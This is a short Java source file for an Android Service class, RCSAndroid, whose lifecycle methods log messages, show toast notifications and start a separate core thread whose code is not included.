package com.android.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;


/**
 * The Class RCSAndroid.
 */
public class RCSAndroid extends Service {
	private static final String TAG = "RCSAndroid";
	
	/* (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		super.onCreate();
		Log.d("QZ", TAG + " (onCreate)");

		Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
		Log.d("QZ", TAG + " (onDestroy)");

		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onStart(android.content.Intent, int)
	 */
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Log.d("QZ", TAG + " (onStart)");
		
		Toast.makeText(this, "Service Started, starting thread", Toast.LENGTH_LONG).show();
		
		CoreThread core = new CoreThread();
		
		// Core starts
		core.Start();
		
		/*try {
			Thread.sleep(30000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
			
		Toast.makeText(this, "Stopping thread", Toast.LENGTH_LONG).show();
		
		// Core stops
		core.Stop();
		core = null;*/
	}
}

